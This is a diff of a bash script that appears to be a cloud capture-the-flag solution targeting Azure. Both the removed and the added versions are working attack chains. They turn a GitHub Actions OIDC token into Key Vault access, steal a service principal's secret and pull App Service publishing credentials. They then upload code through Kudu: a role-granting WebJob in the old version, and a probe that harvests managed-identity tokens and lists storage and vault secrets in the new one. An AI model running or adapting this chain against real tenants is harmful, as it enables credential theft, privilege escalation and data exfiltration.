@@ -1,24 +1,98 @@
 #!/usr/bin/env bash
 set +e
-python3 - <<'PY'
-import base64,json,os,time,urllib.parse,urllib.request,urllib.error
-TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e';SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6';CID='72ff278a-9e71-43ec-bac4-2ca303f8e462';V='https://kv-tbl-prod-x3euoz.vault.azure.net';APP='app-tbl-reporting-prod';RG='rg-tbl-reporting-prod-eus'; ARM='https://management.azure.com'
-def rq(u,m='GET',d=None,h=None,t=20):
- try:
-  x=urllib.request.urlopen(urllib.request.Request(u,data=d,method=m,headers=h or {}),timeout=t);return x.status,x.read()
- except urllib.error.HTTPError as e:return e.code,e.read()
- except Exception as e:return 0,str(e).encode()
-def form(u,o):
- s,b=rq(u,'POST',urllib.parse.urlencode(o).encode(),{'Content-Type':'application/x-www-form-urlencoded'});return json.loads(b).get('access_token','')
-def js(u,t,m='GET',o=None):
- h={'Authorization':'Bearer '+t,'Content-Type':'application/json'};s,b=rq(u,m,json.dumps(o).encode() if o is not None else None,h);return s,b
-oidurl=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api%3A%2F%2FAzureADTokenExchange';s,b=rq(oidurl,h={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']});oid=json.loads(b)['value'];vt=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':CID,'grant_type':'client_credentials','scope':'https://vault.azure.net/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oid});s,b=js(V+'/secrets/reporting-service-principal?api-version=7.4',vt);sp=json.loads(json.loads(b)['value']);at=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sp['appId'],'grant_type':'client_credentials','client_secret':sp['clientSecret'],'scope':'https://management.azure.com/.default'});s,b=js(ARM+'/subscriptions/'+SUB+'/resourceGroups/'+RG+'/providers/Microsoft.Web/sites/'+APP+'/config/publishingcredentials/list?api-version=2023-01-01',at,'POST',{});p=json.loads(b)['properties'];a=base64.b64encode((p['publishingUserName']+':'+p['publishingPassword']).encode()).decode()
-job='''import base64,json,os,time,uuid,urllib.parse,urllib.request,urllib.error\nTEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e";SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6";CID="7a85156a-01c4-4e61-8472-40a92107159b";OUT="/home/site/wwwroot/App_Data/jobs/triggered/flagjob/result.json"\ndef r(u,h={},d=None,m="GET",t=15):\n try:\n  x=urllib.request.urlopen(urllib.request.Request(u,headers=h,data=d,method=m),timeout=t);return x.status,x.read().decode(errors="replace")\n except urllib.error.HTTPError as e:return e.code,e.read().decode(errors="replace")\n except Exception as e:return 0,repr(e)\ndef tok(res):\n e=os.environ.get("IDENTITY_ENDPOINT") or os.environ.get("MSI_ENDPOINT") or "http://169.254.131.3:8081/msi/token";ih=os.environ.get("IDENTITY_HEADER") or os.environ.get("MSI_SECRET") or "";q=e+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01&client_id="+CID;h={"X-IDENTITY-HEADER":ih} if os.environ.get("IDENTITY_ENDPOINT") else {"Secret":ih};s,b=r(q,h);\n if s!=200: raise RuntimeError("identity "+str(s)+" "+b[:300])\n return json.loads(b)["access_token"]\nout={}\ntry:\n v=tok("https://vault.azure.net");a=tok("https://management.azure.com");p=json.loads(base64.urlsafe_b64decode(v.split(".")[1]+"==").decode());oid=p["oid"];scope="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz";u="https://management.azure.com"+scope+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01";body=json.dumps({"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":oid,"principalType":"ServicePrincipal"}}).encode();out["role"]=r(u,{"Authorization":"Bearer "+a,"Content-Type":"application/json"},body,"PUT",20)\n for i in range(20):\n  s,b=r("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",{"Authorization":"Bearer "+tok("https://vault.azure.net")});out["secret"]=(s,b);\n  if s==200:break\n  time.sleep(3)\nexcept Exception as e:out={"error":repr(e)}\nopen(OUT,"w").write(json.dumps(out))\n'''
-for path,data in [('App_Data/jobs/continuous/flagjob/run.py',job),('App_Data/jobs/continuous/flagjob/settings.job','{}')]:
- s,b=rq('https://'+APP+'.scm.azurewebsites.net/api/vfs/site/wwwroot/'+path,'PUT',data.encode(),{'Authorization':'Basic '+a,'If-Match':'*'},40);print('put',path,s,flush=True)
-s,b=rq('https://'+APP+'.scm.azurewebsites.net/api/continuouswebjobs/flagjob','GET',None,{'Authorization':'Basic '+a},20);print('continuous',s,b[:200],flush=True)
-for i in range(24):
- s,b=rq('https://'+APP+'.scm.azurewebsites.net/api/vfs/site/wwwroot/App_Data/jobs/continuous/flagjob/result.json','GET',None,{'Authorization':'Basic '+a},10);print('result',i,s,b[:500],flush=True)
- if b'DF26{' in b:break
- time.sleep(5)
-PY
+TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
+SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
+CICD_ID=72ff278a-9e71-43ec-bac4-2ca303f8e462
+
+echo "[*] Getting OIDC token..."
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+echo "OIDC_LEN=${#OIDC}"
+
+VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+  -d "client_id=$CICD_ID" -d "grant_type=client_credentials" \
+  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+  --data-urlencode "client_assertion=$OIDC" \
+  --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
+echo "VT_LEN=${#VT}"
+
+echo "[*] Getting reporting-service creds from KV prod..."
+RS_JSON=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" \
+  -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+RS_CID=$(echo "$RS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("appId",""))')
+RS_SEC=$(echo "$RS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("clientSecret",""))')
+echo "RS_CID=$RS_CID RS_SEC_LEN=${#RS_SEC}"
+
+RS_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+  -d "client_id=$RS_CID" -d "grant_type=client_credentials" \
+  --data-urlencode "client_secret=$RS_SEC" \
+  --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
+echo "RS_ARM_LEN=${#RS_ARM}"
+
+echo "[*] Getting reporting app Kudu creds..."
+APP=app-tbl-reporting-prod
+RG_R=rg-tbl-reporting-prod-eus
+PUB=$(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_R/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-01-01" \
+  -H "Authorization: Bearer $RS_ARM" -H "Content-Type: application/json" -d '{}')
+KU=$(echo "$PUB" | python3 -c 'import sys,json;print(json.load(sys.stdin)["properties"]["publishingUserName"])')
+KP=$(echo "$PUB" | python3 -c 'import sys,json;print(json.load(sys.stdin)["properties"]["publishingPassword"])')
+echo "KUDU_USER=$KU KUDU_PASS_LEN=${#KP}"
+SCM="https://$APP.scm.azurewebsites.net"
+
+echo "[*] Uploading UAMI probe script..."
+python3 -c "
+import base64,sys
+script = '''
+import os,json,urllib.request,urllib.error,datetime
+IE=os.environ.get(\"IDENTITY_ENDPOINT\",\"\")
+IH=os.environ.get(\"IDENTITY_HEADER\",\"\")
+CID=\"7a85156a-01c4-4e61-8472-40a92107159b\"
+result={\"ie_prefix\":IE[:60],\"ih_len\":len(IH)}
+def tok(res):
+    try:
+        url=IE+\"?resource=\"+res+\"&api-version=2019-08-01&client_id=\"+CID
+        return json.load(urllib.request.urlopen(urllib.request.Request(url,headers={\"X-IDENTITY-HEADER\":IH}),timeout=8))[\"access_token\"]
+    except Exception as e: return \"ERR:\"+str(e)[:100]
+def hget(url,t):
+    ts=datetime.datetime.now(datetime.timezone.utc).strftime(\"%a, %d %b %Y %H:%M:%S GMT\")
+    h={\"Authorization\":\"Bearer \"+t,\"x-ms-version\":\"2021-08-06\",\"x-ms-date\":ts}
+    try: return urllib.request.urlopen(urllib.request.Request(url,headers=h),timeout=10).read().decode()[:4000]
+    except urllib.error.HTTPError as e: return f\"HTTP{e.code}:\"+e.read().decode()[:300]
+    except Exception as e: return \"ERR:\"+str(e)[:200]
+st=tok(\"https://storage.azure.com/\")
+vt=tok(\"https://vault.azure.net/\")
+at=tok(\"https://management.azure.com/\")
+result[\"st_len\"]=len(st)
+result[\"vt_len\"]=len(vt)
+result[\"at_len\"]=len(at)
+if len(st)>100:
+    result[\"backup_exports\"]=hget(\"https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list\",st)
+    result[\"appcfg_config\"]=hget(\"https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list\",st)
+    result[\"backup_containers\"]=hget(\"https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list\",st)
+if len(vt)>100:
+    result[\"kv_sec_list\"]=hget(\"https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4\",vt)
+    result[\"kv_sec_flag\"]=hget(\"https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4\",vt)
+    result[\"kv_prod_flag\"]=hget(\"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/flag?api-version=7.4\",vt)
+if len(at)>100:
+    result[\"kv_sec_arm\"]=hget(\"https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01\",at)
+    result[\"backup_roles\"]=hget(\"https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01\",at)
+print(json.dumps(result,indent=2))
+'''
+print(script)
+" > /tmp/probe.py
+
+VFS=$(curl -s -o /tmp/vfs_resp.txt -w "%{http_code}" -u "$KU:$KP" \
+  -X PUT "$SCM/api/vfs/site/wwwroot/probe.py" \
+  -H "Content-Type: text/plain" \
+  --data-binary @/tmp/probe.py --max-time 30)
+echo "VFS_PUT=$VFS $(cat /tmp/vfs_resp.txt | head -c 200)"
+
+echo "[*] Executing probe via Kudu command..."
+CMD_OUT=$(curl -s -u "$KU:$KP" \
+  -X POST "$SCM/api/command" \
+  -H "Content-Type: application/json" \
+  --max-time 90 \
+  -d '{"command":"python3 /home/site/wwwroot/probe.py","dir":"/"}')
+echo "PROBE_OUTPUT:"
+echo "$CMD_OUT"
+echo "ALL_DONE"
